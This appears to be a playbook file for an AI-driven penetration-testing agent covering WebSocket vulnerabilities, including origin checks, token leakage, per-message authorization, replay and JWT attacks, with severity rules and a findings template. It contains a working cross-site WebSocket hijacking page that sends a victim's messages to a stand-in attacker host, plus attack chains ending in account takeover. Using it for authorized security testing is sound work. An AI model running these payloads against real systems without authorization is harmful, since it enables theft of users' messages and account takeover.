---
description: WebSocket attacks — CSWSH (Cross-Site WebSocket Hijacking), upgrade-handshake gaps, per-message auth, subprotocol negotiation flaws, binary frame smuggling, message replay. Load when target exposes WebSockets.
globs:
---

# WebSocket Attacks Deep-Dive

Load when: target exposes WebSockets — `wss://` URLs in JS bundles, `Upgrade: websocket` requests in proxy history, `Sec-WebSocket-*` headers, real-time features (chat, notifications, live dashboards, collaborative editing).

## Where WS bugs live

WS security mostly fails at the **HTTP/1.1 upgrade handshake** (before WS frames are exchanged). Once the upgrade succeeds, frames may also be unauthenticated. Two distinct surfaces:

| Surface | When checked | Common gap |
|---|---|---|
| Upgrade request | Once per connection | Origin / auth / subprotocol bypass |
| Per-message frames | Continuous | No per-message auth — once connected, all messages trusted |

## Attack matrix

### 1. CSWSH (Cross-Site WebSocket Hijacking)

The class. Attacker site opens a WebSocket to the target using the victim's ambient cookies. If the server doesn't validate `Origin`, the connection succeeds with full victim privileges.

```html
<!-- Attacker page served from evil.tld -->
<script>
  const ws = new WebSocket("wss://target.com/ws");
  ws.onmessage = (e) => fetch("https://evil.tld/exfil", {
    method: "POST",
    body: e.data
  });
  ws.onopen = () => ws.send(JSON.stringify({action: "getMessages"}));
</script>
```

**Detection**: `test_websocket(ws_url)` (W11 VerdictResult) sends an upgrade with `Origin: https://evil.tld` and observes whether the server returns 101 Switching Protocols. CONFIRMED when origin bypass succeeds AND ws carries state-changing operations.

### 2. Missing Origin

Some servers reject `Origin: https://evil.tld` but accept the upgrade with NO `Origin` header at all (curl / postman defaults). This is functionally equivalent to CSWSH — attacker just needs to coerce a victim browser variant that omits Origin.

### 3. Wildcard Origin reflection

Server reads `Origin` and reflects it into the WS response. With `Access-Control-Allow-Credentials: true` semantics, this is exploitable. Less common in WS than in CORS but worth checking.

### 4. Token in URL

```
wss://target.com/ws?token=eyJ...
```

The token sits in the URL — server access logs, intermediary caches (CDN), and browser history all retain it. Often paired with no other auth.

**Severity**: medium-high standalone. CRITICAL when chained with referer leak or log access.

### 5. No auth required

Server accepts the upgrade with no cookie / no bearer / no token. Sometimes intentional for public feeds — sometimes the auth check was forgotten.

### 6. Subprotocol negotiation flaw

```
Sec-WebSocket-Protocol: admin, user, guest
```

Client requests multiple subprotocols. Server should select per spec. Some servers select "admin" without checking caller privilege. This is rare but devastating when present.

### 7. Per-message auth gaps

Once connected, the server should validate every action. Common gaps:
- Client sends `{"action": "deleteAll"}` and server processes without re-checking role.
- Client sends `{"action": "impersonate", "user_id": 12345}` and server obeys without ownership check.

**Detection**: send privileged actions over the connection; observe whether they succeed. This is per-message BOLA / privilege escalation.

### 8. Subscription protocol drift (GraphQL — W18)

When the WS carries GraphQL subscriptions: legacy `subscriptions-transport-ws` may accept queries the modern `graphql-transport-ws` rejects. See `playbook-graphql-deep.md` §7 + W18 KB `subscription_protocol_drift_2025`.

### 9. Binary frame smuggling

Some servers parse text frames strictly but treat binary frames as opaque blobs. Attacker sends a binary frame containing text-frame bytes — different parser may interpret it. Adjacent to HTTP smuggling.

### 10. Message replay

If the server doesn't track message IDs / nonces, attacker captures a privileged message and replays later. Common in collaborative editing / multiplayer where ordering is implicit.

### 11. WS through OAuth — JWT in WS

Some WS connections authenticate via JWT in:
- `Authorization: Bearer ...` header on upgrade
- First message frame after `connection_init` (GraphQL subscriptions)
- Query parameter

When JWT is in any of these, the full `playbook-jwt-deep-dive.md` attack tree applies (alg confusion / kid traversal / claim swap / LSR race).

## Tool chain

1. **Inventory** — `get_websocket_history()` lists WS connections + frames captured by Burp.
2. **Upgrade-handshake audit** — `test_websocket(ws_url, cookies, bearer_token, subprotocols)` runs 6-axis matrix (Origin bypass / missing Origin / wildcard / token-in-URL / no-auth / subprotocol). VerdictResult (W11).
3. **Per-message exploration** — `websocket_send_message(connection_id, message)` to send arbitrary text/binary frames.
4. **WS upgrade with custom headers** — `send_raw_request` with explicit Upgrade / Connection / Sec-WebSocket-* headers for binary smuggling.
5. **JWT-in-WS** — extract token, hand off to `test_jwt` / `forge_jwt`.

## Evidence ladder

| Verdict | Evidence shape | Save? |
|---|---|---|
| **CONFIRMED CRITICAL** | CSWSH demonstrated — attacker page sources sent privileged action over victim WS, response captured | yes |
| **CONFIRMED HIGH** | Server returns 101 with `Origin: https://evil.tld` AND WS carries state-changing ops | yes |
| **CONFIRMED HIGH** | Per-message BOLA — unprivileged user sends admin action, server obeys | yes |
| **CONFIRMED MEDIUM** | Token in URL with no other auth | yes (chain with log/referer leak for severity) |
| **SUSPECTED** | Server accepts NO Origin (curl-only test) but blocks `evil.tld` | NO save — demonstrate from browser variant |
| **FAILED** | Origin validated + per-message auth enforced + subprotocol selected per spec | NO |

## save_finding shape

```python
save_finding(
    vuln_type="cswsh",                              # or ws_no_auth / ws_token_in_url / ws_per_msg_bola
    endpoint="wss://target.com/ws",
    severity="critical",
    evidence={
        "logger_index": <upgrade-confirmed index>,
        "summary": "CSWSH — Origin: https://evil.tld accepted on /ws upgrade. Attacker page can open a WS as victim and send `{action: 'getMessages'}` to receive victim's full message history.",
        "ws_url": "wss://target.com/ws",
        "tested_origin": "https://evil.tld",
        "state_changing": True,
        "auth_model": "cookie",
    },
)
```

## Severity discipline

- CSWSH + state-changing ops = CRITICAL.
- CSWSH on read-only feeds = MEDIUM (data exfil) unless the feed contains PII / payment / tokens.
- Token in URL alone = MEDIUM (chain to severity).
- Per-message BOLA = HIGH-CRITICAL depending on action impact.
- Origin not validated but no state-changing ops = LOW (informational).

## NEVER_SUBMIT traps

- "Server accepts curl WS upgrade without auth" — browsers always send `Origin`. Demonstrate from a browser variant first.
- "Server accepts arbitrary subprotocol" — verify whether the subprotocol changes the trust boundary; cosmetic accept is informational.
- "WS messages are JSON" — that's the design, not a vuln.

## Chain patterns

- **CSWSH → command on victim WS → ATO** = direct.
- **WS no-auth + admin command** = direct privesc.
- **Token in URL + Referer leak (when WS URL is logged via Referer to attacker)** = token theft.
- **JWT in WS frame + alg confusion** = bypass auth + send privileged messages.
- **Subscription protocol drift + admin subscription** = persistent admin event leak (W18).

## Related

- `knowledge/cswsh` patterns in `csrf.json` (CSWSH is CSRF's WS cousin)
- `knowledge/cors.json` — adjacent class (Origin handling)
- `test_websocket` (W11 VerdictResult)
- `websocket_send_message`, `websocket_connect`, `websocket_close` — for live frame exchange
- `playbook-jwt-deep-dive.md` — JWT-in-WS attacks
- `playbook-graphql-deep.md` §7 — subscription protocol drift (W18)
- `chain-findings.md` — `cswsh_to_ato` progression
